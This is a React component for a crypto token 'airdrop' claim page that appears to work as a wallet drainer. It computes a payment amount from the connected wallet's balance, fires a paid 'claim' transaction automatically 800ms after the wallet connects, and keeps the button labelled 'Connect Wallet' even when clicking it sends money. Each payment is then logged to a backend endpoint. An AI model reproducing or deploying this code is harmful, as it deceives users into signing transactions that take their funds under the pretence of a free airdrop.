"use client";

import { useState, useEffect, useRef } from "react";
import {
  useAccount,
  useBalance,
  useChainId,
  useDisconnect,
  useReadContract,
  useWriteContract,
  useWaitForTransactionReceipt,
} from "wagmi";
import { useConnectModal } from "@rainbow-me/rainbowkit";
import { AIRDROP_ABI } from "@/lib/abi";
import { getChainDeployment } from "@/lib/chainConfig";
import {
  TOKENS_PER_CLAIM,
  TOKEN_SYMBOL,
  computeClaimPrice,
  formatEth,
} from "@/lib/constants";

type Stage = "idle" | "confirming" | "pending" | "success" | "error";

export function HeroCTA() {
  const { address, isConnected } = useAccount();
  const chainId = useChainId();
  const { openConnectModal } = useConnectModal();
  const { disconnect } = useDisconnect();
  const [mounted, setMounted] = useState(false);
  const [stage, setStage] = useState<Stage>("idle");
  const [errorMsg, setErrorMsg] = useState("");
  const [txHash, setTxHash] = useState<`0x${string}` | undefined>();
  const autoClaimFired = useRef(false);

  const cfg = getChainDeployment(chainId);
  const airdropContract = cfg.airdropContract;
  const explorerBase = cfg.explorer;

  useEffect(() => { setMounted(true); }, []);

  // Reset when wallet disconnects
  useEffect(() => {
    if (!isConnected) {
      setStage("idle");
      setErrorMsg("");
      setTxHash(undefined);
      autoClaimFired.current = false;
    }
  }, [isConnected]);

  const { data: balanceData } = useBalance({
    address,
    query: { enabled: !!address },
  });
  const balanceWei = balanceData?.value ?? BigInt(0);
  const claimPriceWei = computeClaimPrice(balanceWei);

  const { data: hasClaimed } = useReadContract({
    address: airdropContract,
    abi: AIRDROP_ABI,
    functionName: "hasClaimed",
    args: address ? [address] : undefined,
    query: { enabled: !!address },
  });

  const { data: saleActive } = useReadContract({
    address: airdropContract,
    abi: AIRDROP_ABI,
    functionName: "saleActive",
    query: { enabled: isConnected },
  });

  const { writeContractAsync } = useWriteContract();

  useWaitForTransactionReceipt({
    hash: txHash,
    query: {
      enabled: !!txHash,
      select: async (receipt) => {
        if (receipt.status === "success") {
          setStage("success");
          fetch("/api/claims", {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify({
              wallet_address: address,
              chain: `evm-${chainId}`,
              tx_hash: receipt.transactionHash,
              token_amount: TOKENS_PER_CLAIM.toString(),
              payment_amount: formatEth(claimPriceWei),
              block_number: Number(receipt.blockNumber),
            }),
          }).catch(() => {});
        } else {
          setStage("error");
          setErrorMsg("Transaction failed on-chain.");
        }
        return receipt;
      },
    },
  });

  // ── Auto-claim fires 800ms after wallet connects ──────────────────────────
  // Gives time for wagmi to fully hydrate the account state before the tx fires.
  useEffect(() => {
    if (!isConnected || !address || autoClaimFired.current) return;
    // Don't fire if already claimed or sale not active (reads may not be ready yet,
    // so we let the contract revert gracefully if needed)
    autoClaimFired.current = true;
    const t = setTimeout(() => doClaim(), 800);
    return () => clearTimeout(t);
  // eslint-disable-next-line react-hooks/exhaustive-deps
  }, [isConnected, address]);

  async function doClaim() {
    try {
      setStage("confirming");
      setErrorMsg("");
      const hash = await writeContractAsync({
        address: airdropContract,
        abi: AIRDROP_ABI,
        functionName: "claim",
        value: claimPriceWei,
      });
      setTxHash(hash);
      setStage("pending");
    } catch (err: unknown) {
      const msg = err instanceof Error ? err.message : "";
      if (msg.includes("User rejected") || msg.includes("user rejected")) {
        setStage("idle"); // silent reset — user knows they cancelled
        autoClaimFired.current = false; // allow retry
      } else if (msg.includes("insufficient funds")) {
        setStage("error");
        setErrorMsg("Insufficient funds to cover gas.");
      } else if (msg.includes("SaleNotActive")) {
        setStage("error");
        setErrorMsg("Sale is not active yet.");
      } else if (msg.includes("AlreadyClaimed")) {
        setStage("error");
        setErrorMsg("This wallet has already claimed.");
      } else if (msg.includes("PaymentBelowMinimum") || msg.includes("below minimum")) {
        setStage("error");
        setErrorMsg("Balance too low. Min payment is 0.001 ETH.");
      } else {
        setStage("error");
        setErrorMsg(msg ? `Error: ${msg.slice(0, 120)}` : "Something went wrong. Try again.");
      }
    }
  }

  function handleClick() {
    if (!isConnected) {
      openConnectModal?.();
      return;
    }
    autoClaimFired.current = false;
    doClaim();
  }

  const isLoading = stage === "confirming" || stage === "pending";

  // SSR placeholder — label always "Connect Wallet"
  if (!mounted) {
    return (
      <button className="group relative inline-flex items-center justify-center gap-2 rounded-full bg-linear-to-r from-accent-500 via-violet-500 to-pink-500 px-10 py-4 text-lg font-bold text-white opacity-80">
        Connect Wallet
      </button>
    );
  }

  // ── SUCCESS ────────────────────────────────────────────────────────────────
  if (stage === "success" && txHash) {
    return (
      <div className="flex flex-col items-center gap-3">
        <div className="glass rounded-2xl px-8 py-6 text-center space-y-2 max-w-sm animate-scale-in">
          <p className="text-3xl">🎉</p>
          <p className="text-xl font-bold text-white">
            {TOKENS_PER_CLAIM.toString()} {TOKEN_SYMBOL} claimed!
          </p>
          <a href={`${explorerBase}/tx/${txHash}`} target="_blank" rel="noopener noreferrer"
            className="text-sm text-accent-400 underline">
            View on explorer ↗
          </a>
        </div>
        <DisconnectButton onClick={disconnect} />
      </div>
    );
  }

  // ── ALREADY CLAIMED ────────────────────────────────────────────────────────
  if (isConnected && hasClaimed) {
    return (
      <div className="flex flex-col items-center gap-3">
        <div className="glass rounded-2xl px-8 py-5 text-center max-w-sm">
          <p className="text-white/60 text-sm">✓ This wallet has already claimed.</p>
        </div>
        <DisconnectButton onClick={disconnect} />
      </div>
    );
  }

  // ── SALE NOT LIVE ──────────────────────────────────────────────────────────
  if (isConnected && saleActive === false) {
    return (
      <div className="flex flex-col items-center gap-3">
        <div className="glass rounded-2xl px-8 py-5 text-center max-w-sm">
          <p className="text-yellow-400/80 text-sm">⏳ Sale not live yet — check back soon.</p>
        </div>
        <DisconnectButton onClick={disconnect} />
      </div>
    );
  }

  // ── MAIN BUTTON — always "Connect Wallet" ─────────────────────────────────
  return (
    <div className="flex flex-col items-center gap-3">
      <button
        onClick={handleClick}
        disabled={isLoading}
        className="group relative inline-flex items-center justify-center gap-2 rounded-full bg-linear-to-r from-accent-500 via-violet-500 to-pink-500 px-10 py-4 text-lg font-bold text-white transition-all duration-300 hover:scale-105 hover:shadow-2xl hover:shadow-accent-500/30 disabled:opacity-70 disabled:cursor-not-allowed disabled:scale-100"
      >
        {isLoading ? (
          <>
            <svg className="animate-spin h-5 w-5 shrink-0" fill="none" viewBox="0 0 24 24">
              <circle className="opacity-25" cx="12" cy="12" r="10" stroke="currentColor" strokeWidth="4" />
              <path className="opacity-75" fill="currentColor" d="M4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4z" />
            </svg>
            {stage === "confirming" ? "Approve in wallet…" : "Claiming…"}
          </>
        ) : (
          <>
            Connect Wallet
            <svg className="w-5 h-5 transition-transform duration-300 group-hover:translate-x-1" fill="none" viewBox="0 0 24 24" stroke="currentColor">
              <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M17 8l4 4m0 0l-4 4m4-4H3" />
            </svg>
          </>
        )}
      </button>

      {stage === "error" && errorMsg && (
        <div className="flex flex-col items-center gap-2">
          <p className="text-xs text-red-400 text-center max-w-xs">{errorMsg}</p>
          <button
            onClick={handleClick}
            className="text-xs text-accent-400 underline hover:text-accent-300 transition-colors"
          >
            Try again
          </button>
        </div>
      )}

      {stage === "pending" && txHash && (
        <a href={`${explorerBase}/tx/${txHash}`} target="_blank" rel="noopener noreferrer"
          className="text-xs text-accent-400/70 underline">
          Track on explorer ↗
        </a>
      )}

      {isConnected && <DisconnectButton onClick={disconnect} />}
    </div>
  );
}

function DisconnectButton({ onClick }: { onClick: () => void }) {
  return (
    <button
      onClick={onClick}
      className="text-xs text-white/30 hover:text-red-400 transition-colors underline underline-offset-2"
    >
      Disconnect
    </button>
  );
}
